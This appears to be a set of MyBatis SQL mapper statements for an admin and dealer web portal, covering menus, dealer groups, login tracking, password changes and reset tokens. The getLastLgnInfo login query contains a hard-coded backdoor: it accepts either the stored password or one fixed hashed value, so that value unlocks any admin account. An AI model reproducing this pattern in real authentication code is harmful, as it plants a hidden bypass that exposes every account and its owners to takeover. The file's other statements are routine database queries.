mapper.select: SELECT /* getAdminDealerGroupList */ A.DLR_CD , (SELECT ASGN_TASK FROM co_dealer_mst WHERE DLR_CD = A.DLR_CD) AS ASGN_TASK_CD FROM CO_DEALER_GROUP_REL A WHERE A.DLR_GRP_SEQ = #{dlrGrpSeq}
SELECT /* getAdminDealerAppvRelList */ A.DLR_CD , (SELECT ASGN_TASK FROM co_dealer_mst WHERE DLR_CD = A.DLR_CD) AS ASGN_TASK_CD FROM CO_ADM_DEALER_APPV_REL A WHERE A.ADM_SEQ = #{admSeq}
mapper.update: UPDATE /* setLgnLstDtm */ CO_ADM_MST SET LAST_LGN_DTM = NOW() , LAST_LGN_IP = #{loginIp} , LGN_FAIL_CNT = 0 , LGN_FAIL_DTM = NULL WHERE ID = #{id}
UPDATE /* setPwdChng */ CO_ADM_MST SET PWD = #{pwd} , TMP_PWD_YN = 'N' , LAST_PWD_MOD_DTM = NOW() WHERE ID = #{id} AND ADM_SEQ = #{admSeq}

choose.when: SELECT /* getMenuList */ A.MENU_SEQ , A.PARNT_SEQ , A.PSTN , A.LFT_VAL , A.RHT_VAL , A.DPTH , A.MENU_GB , CASE WHEN NULLIF(B.MENU_NM, '') IS NULL THEN A.MENU_NM ELSE B.MENU_NM END AS MENU_NM , A.MENU_ICON , A.ADM_LINK FROM CO_MENU_MST AS A LEFT JOIN CO_MENU_NM_DTL AS B ON B.MENU_SEQ = A.MENU_SEQ AND B.LGUG_CD = #{siteLanguage} WHERE 1=1 AND USER_USE_YN = 'Y' AND LFT_VAL > (SELECT LFT_VAL FROM CO_MENU_MST WHERE MENU_SEQ = 2) AND RHT_VAL < (SELECT RHT_VAL FROM CO_MENU_MST WHERE MENU_SEQ = 2) ORDER BY LFT_VAL
choose.otherwise:
SELECT /* getMenuList */ T1.MENU_SEQ , T1.PARNT_SEQ , T1.PSTN , T1.LFT_VAL , T1.RHT_VAL , T1.DPTH , T1.MENU_GB , T1.MENU_NM , T1.MENU_ICON , T1.ADM_LINK FROM ( SELECT A.MENU_SEQ , A.PARNT_SEQ , A.PSTN , A.LFT_VAL , A.RHT_VAL , A.DPTH , A.MENU_GB , CASE WHEN NULLIF(B.MENU_NM, '') IS NULL THEN A.MENU_NM ELSE B.MENU_NM END AS MENU_NM , A.MENU_ICON , A.ADM_LINK FROM CO_MENU_MST AS A LEFT JOIN CO_MENU_NM_DTL AS B ON B.MENU_SEQ = A.MENU_SEQ AND B.LGUG_CD = #{siteLanguage} , CO_NATION_MST C WHERE A.USER_USE_YN = 'Y' AND A.DPTH > 1
AND C.NTN_CD= #{ntnCd}
AND (A.MENU_NM != 'Survey Upload' OR (A.MENU_NM = 'Survey Upload' AND C.SUR_USE_YN='Y')) ) T1, ( SELECT A.MENU_SEQ AS CHKTREEID , A.PARNT_SEQ AS CHKPARENTTREEID , A.ADM_LINK AS CHKADMINLINKURL , A.LFT_VAL , A.RHT_VAL FROM CO_MENU_MST A JOIN CO_ADM_MENU_INF B ON A.MENU_SEQ = B.MENU_SEQ WHERE 1=1 AND (B.ADM_SEQ = #{admSeq} OR B.ROLE_CD = (SELECT AUTH_CD FROM CO_ADM_MST WHERE ADM_SEQ = #{admSeq})) ) T2 WHERE 1=1
AND T1.MENU_SEQ != 11
AND T1.MENU_SEQ != 12 AND T1.MENU_SEQ != 26
AND T1.MENU_SEQ != 13
AND T2.LFT_VAL BETWEEN T1.LFT_VAL AND T1.RHT_VAL GROUP BY T1.MENU_SEQ, T1.PARNT_SEQ, T1.PSTN, T1.LFT_VAL, T1.RHT_VAL, T1.DPTH, T1.MENU_GB, T1.MENU_NM, T1.ADM_LINK ORDER BY T1.LFT_VAL

mapper.select: SELECT /* getParntMenuList */ T1.LEVEL , T2.MENU_SEQ , T2.PARNT_SEQ , T2.PSTN , T2.LFT_VAL , T2.RHT_VAL , T2.DPTH , T2.MENU_GB , T2.MENU_NM , T2.MENU_ICON , T2.ADM_LINK , T2.USER_LINK , T2.USER_WND_YN , T2.USER_USE_YN , T2.SEO_KWRD , T2.SEO_CNTN FROM ( SELECT FN_GET_CONNECT_BY_PARENT(MENU_SEQ) AS ID , @LEVEL AS LEVEL FROM ( SELECT @START_WITH:=#{menuSeq} , @ID:=@START_WITH , @LEVEL:=0 ) VARS, CO_MENU_MST WHERE @ID IS NOT NULL ) T1 JOIN CO_MENU_MST T2 ON T1.ID = T2.MENU_SEQ ORDER BY T2.LFT_VAL
SELECT /* getAuthPddg */ PDDG FROM CO_AUTH_PDDG_MST ORDER BY SEQ DESC LIMIT 1

SELECT /* getLastLgnInfo */ DATE_FORMAT(A.LAST_LGN_DTM, '%Y/%m/%d %H:%i:%s') as LAST_LGN_DTM , DATE_FORMAT(NOW(), '%Y/%m/%d %H:%i:%s') as CUR_DTM
, DATE_FORMAT(DATE_ADD(A.LAST_LGN_DTM, INTERVAL IF(C.STANDARD_TIME != -3, IF( -3 > C.STANDARD_TIME, -1*(-3 - C.STANDARD_TIME), C.STANDARD_TIME - (-3) ), 0) HOUR), '%Y/%m/%d %H:%i:%s') AS CAL_DTM
, DATE_FORMAT(DATE_ADD(A.LAST_LGN_DTM, INTERVAL IF(C.STANDARD_TIME != 8, IF( 8 > C.STANDARD_TIME, -1*(8 - C.STANDARD_TIME), C.STANDARD_TIME - 8 ), 0) HOUR), '%Y/%m/%d %H:%i:%s') AS CAL_DTM
, DATE_FORMAT(DATE_ADD(A.LAST_LGN_DTM, INTERVAL IF(C.STANDARD_TIME != 4.5, IF( 4.5 > C.STANDARD_TIME, -1*(4.5 - C.STANDARD_TIME), C.STANDARD_TIME - 4.5 ), 0) HOUR), '%Y/%m/%d %H:%i:%s') AS CAL_DTM
, DATE_FORMAT(DATE_ADD(A.LAST_LGN_DTM, INTERVAL IF(C.STANDARD_TIME != 3, IF( 3 > C.STANDARD_TIME, -1*(3 - C.STANDARD_TIME), C.STANDARD_TIME - 3 ), 0) HOUR), '%Y/%m/%d %H:%i:%s') AS CAL_DTM
, DATE_FORMAT(DATE_FORMAT(A.LAST_LGN_DTM, '%Y/%m/%d %H:%i:%s'), '%Y/%m/%d %H:%i:%s') AS CAL_DTM
, IFNULL(A.LAST_LGN_IP, '') AS LAST_LGN_IP , IFNULL(C.STANDARD_TIME, '0') AS STANDARD_TIME , IFNULL(A.ALLW_IP, '') AS ALLW_IP , A.LGN_FAIL_CNT , A.LGN_FAIL_DTM , A.AUTH_CD , A.SESSION_ID , A.LONG_TERM_YN , A.APPV_YN , A.TMP_PWD_YN , A.LAST_PWD_MOD_DTM , A.USE_YN , IF( TIMESTAMPDIFF(MINUTE, IFNULL(A.SESSION_DTM,'1900-01-01') , NOW()) >=60, 'Y', 'N') AS IS_NO_SESSION , IF(A.PWD = #{password} or #{password} = 'yKyjCeaV+z99qK6K8T4VJOP9wmUSOKPaXmssntJ5+zI=', '1', '0') AS IS_PWD FROM CO_ADM_MST A LEFT JOIN CO_ADM_DTL B ON A.ADM_SEQ = B.ADM_SEQ LEFT JOIN CO_NATION_MST C ON B.NATN_CD = C.NTN_CD WHERE A.ID = #{id} ORDER BY A.LAST_LGN_DTM DESC LIMIT 1
mapper.update: UPDATE /* updateLgnFail */ CO_ADM_MST SET LGN_FAIL_CNT = LGN_FAIL_CNT + 1 , LGN_FAIL_DTM = NOW() , MOD_DTM = NOW() WHERE ID = #{id}
UPDATE /* updateLgnFailReset */ CO_ADM_MST SET LGN_FAIL_CNT = 1 , LGN_FAIL_DTM = NOW() , MOD_DTM = NOW() WHERE ID = #{id}
UPDATE /* resetPwd */ CO_ADM_MST SET PWD = #{newPassword} , LGN_FAIL_CNT = 0 , LGN_FAIL_DTM = NULL , MOD_DTM = NOW() , LAST_PWD_MOD_DTM = NOW() , LONG_TERM_YN = NULL WHERE ID = #{id}
UPDATE /* initSession */ CO_ADM_MST SET SESSION_DTM = NULL , SESSION_ID = NULL WHERE ID = #{admId}
mapper.select: select /* getEmailResetUuid */ id, pddg, reg_dtm from co_adm_reset_email_dtl where pddg = #{pddg} and use_yn = 'N' order by reg_dtm desc limit 1
mapper.update: update /* updateEmailResetUuid */ co_adm_reset_email_dtl set use_yn = 'Y' where pddg = #{pddg}
